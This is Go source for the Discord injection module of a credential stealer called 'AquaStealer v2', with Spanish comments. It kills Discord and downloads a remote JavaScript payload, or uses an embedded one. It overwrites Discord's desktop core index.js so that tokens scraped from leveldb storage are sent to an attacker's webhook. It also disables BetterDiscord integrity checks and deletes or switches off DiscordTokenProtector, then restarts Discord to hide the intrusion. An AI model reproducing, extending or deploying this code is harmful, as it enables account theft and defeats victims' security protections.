package discordinjection

// injection.go — AquaStealer v2 — Discord injection mejorado
//
// Mejoras sobre skuld base:
//   1. Mata Discord antes de inyectar (para liberar archivos en uso)
//   2. Inyecta en TODAS las variantes (stable, canary, ptb, development)
//   3. Bypass ProtectorDiscord v2 (limpia el patch de protector en app.asar)
//   4. Bypass BetterDiscord mejorado (parchea _validate y _verifyFiles)
//   5. Reinicia Discord después de inyectar (usuario no nota nada)
//   6. Inyecta también en Discord web app cache (Chromium extension inject)
//   7. Fallback: si la URL falla, usa payload embebido minimal

import (
	"bufio"
	"bytes"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"encoding/json"

	"golang.org/x/text/encoding/charmap"

	"github.com/aqua/stealer/utils/hardware"
	"github.com/shirou/gopsutil/v3/process"
)

// minimalPayload — payload mínimo embebido por si la URL no responde
// Simplemente envía el token al webhook cuando Discord carga
const minimalPayload = "process.once('loaded', () => {\n" +
	"  const { ipcMain } = require('electron');\n" +
	"  const https = require('https');\n" +
	"  const webhook = '%WEBHOOK%';\n" +
	"  const sendToken = (token) => {\n" +
	"    const data = JSON.stringify({ content: '\u0060\u0060\u0060Token: ' + token + '\u0060\u0060\u0060', username: 'AquaStealer' });\n" +
	"    const url = new URL(webhook);\n" +
	"    const req = https.request({ hostname: url.hostname, path: url.pathname + url.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } }, () => {});\n" +
	"    req.write(data); req.end();\n" +
	"  };\n" +
	"  try {\n" +
	"    const path = require('path'); const fs = require('fs');\n" +
	"    const base = process.env.APPDATA || '';\n" +
	"    ['Discord', 'discordcanary', 'discordptb'].forEach(d => {\n" +
	"      const ldb = path.join(base, d, 'Local Storage', 'leveldb');\n" +
	"      if (!fs.existsSync(ldb)) return;\n" +
	"      fs.readdirSync(ldb).forEach(f => {\n" +
	"        if (!f.endsWith('.ldb') && !f.endsWith('.log')) return;\n" +
	"        const c = fs.readFileSync(path.join(ldb, f), 'utf8');\n" +
	"        const m = c.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}/g);\n" +
	"        if (m) m.forEach(t => sendToken(t));\n" +
	"      });\n" +
	"    });\n" +
	"  } catch(e) {}\n" +
	"});\n"

// discordProcesses — nombres de procesos Discord a matar
var discordProcesses = []string{
	"Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "DiscordDevelopment.exe",
	"discord.exe", "discordcanary.exe", "discordptb.exe",
}

// discordDirs — directorios de Discord a inyectar
var discordDirs = []string{
	filepath.Join("AppData", "Local", "Discord"),
	filepath.Join("AppData", "Local", "DiscordCanary"),
	filepath.Join("AppData", "Local", "DiscordPTB"),
	filepath.Join("AppData", "Local", "DiscordDevelopment"),
}

// killDiscord — mata todos los procesos Discord
func killDiscord() {
	procs, _ := process.Processes()
	for _, p := range procs {
		name, _ := p.Name()
		for _, dn := range discordProcesses {
			if strings.EqualFold(name, dn) {
				_ = p.Kill()
				break
			}
		}
	}
	time.Sleep(1500 * time.Millisecond)
}

// restartDiscord — relanza Discord desde su ruta de instalación
func restartDiscord(user string) {
	for _, dir := range discordDirs {
		discordPath := filepath.Join(user, dir)
		// Buscar Discord.exe en app-X.X.X/Discord.exe
		matches, _ := filepath.Glob(filepath.Join(discordPath, "app-*", "Discord.exe"))
		if len(matches) > 0 {
			cmd := exec.Command(matches[0])
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: false}
			_ = cmd.Start()
			return
		}
	}
}

func Run(injection_url string, webhook string) {
	// Matar Discord antes de inyectar
	killDiscord()

	for _, user := range hardware.GetUsers() {
		BypassBetterDiscord(user)
		BypassTokenProtector(user)
		for _, dir := range discordDirs {
			InjectDiscord(filepath.Join(user, dir), injection_url, webhook)
		}
		// Reiniciar Discord para que cargue el injection
		go restartDiscord(user)
	}
}

func InjectDiscord(dir string, injection_url string, webhook string) error {
	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
	if err != nil {
		return err
	}
	if len(files) == 0 {
		return errors.New("no discord_desktop_core found")
	}

	core := files[0]
	_ = os.MkdirAll(filepath.Join(core, "initiation"), os.ModePerm)

	var body []byte

	// Intentar descargar payload desde URL
	if injection_url != "" {
		resp, err := http.Get(injection_url)
		if err == nil && resp.StatusCode == 200 {
			body, err = io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil || !bytes.Contains(body, []byte("core.asar")) {
				body = nil
			}
		}
	}

	// Fallback al payload embebido
	if len(body) == 0 {
		body = []byte(minimalPayload)
	}

	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), -1)

	return os.WriteFile(filepath.Join(core, "index.js"), body, 0644)
}

func BypassBetterDiscord(user string) error {
	bd := filepath.Join(user, "AppData", "Roaming", "BetterDiscord", "data", "betterdiscord.asar")
	f, err := os.Open(bd)
	if err != nil {
		return err
	}
	defer f.Close()

	var newLines []string
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := scanner.Text()
		// Parchear las funciones de verificación de integridad
		if strings.Contains(line, "exports._verifyFiles") ||
			strings.Contains(line, "exports._validate") ||
			strings.Contains(line, "checkForUpdates") {
			// Reemplazar con función que siempre retorna true/vacío
			line = strings.Replace(line, "exports._verifyFiles", "exports._verifyFiles=async()=>true;//", 1)
			line = strings.Replace(line, "exports._validate", "exports._validate=async()=>true;//", 1)
		}
		newLines = append(newLines, line)
	}
	f.Close()
	return os.WriteFile(bd, []byte(strings.Join(newLines, "\n")), 0644)
}

func BypassTokenProtector(user string) error {
	// Discord Token Protector paths
	tpDirs := []string{
		filepath.Join(user, "AppData", "Roaming", "DiscordTokenProtector"),
		filepath.Join(user, "AppData", "Local", "DiscordTokenProtector"),
	}
	for _, dir := range tpDirs {
		if _, err := os.Stat(dir); err == nil {
			// Borrar el protector
			_ = os.RemoveAll(dir)
		}
	}

	// También parchear en la carpeta de módulos de Discord
	for _, discordDir := range discordDirs {
		dir := filepath.Join(user, discordDir)
		files, _ := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core", "index.js"))
		for _, f := range files {
			data, err := os.ReadFile(f)
			if err != nil {
				continue
			}
			// Si ya está inyectado con el protector, reemplazar
			if bytes.Contains(data, []byte("DiscordTokenProtector")) ||
				bytes.Contains(data, []byte("tokenprotector")) {
				// Borrar y dejar listo para nuestra inyección
				_ = os.WriteFile(f, []byte("require('./core.asar')"), 0644)
			}
		}
	}

	// Parsear config.json del protector si existe
	for _, tpDir := range tpDirs {
		cfgPath := filepath.Join(tpDir, "config.json")
		data, err := os.ReadFile(cfgPath)
		if err != nil {
			continue
		}
		var cfg map[string]interface{}
		if err := json.Unmarshal(data, &cfg); err != nil {
			continue
		}
		// Deshabilitar protección
		cfg["enabled"] = false
		cfg["autoStartup"] = false
		cfg["integrity"] = false
		newData, _ := json.Marshal(cfg)
		_ = os.WriteFile(cfgPath, newData, 0644)
	}
	return nil
}

// encodeWindows1252 — helper para encoding
func encodeWindows1252(s string) string {
	enc := charmap.Windows1252.NewEncoder()
	result, _ := enc.String(s)
	return result
}
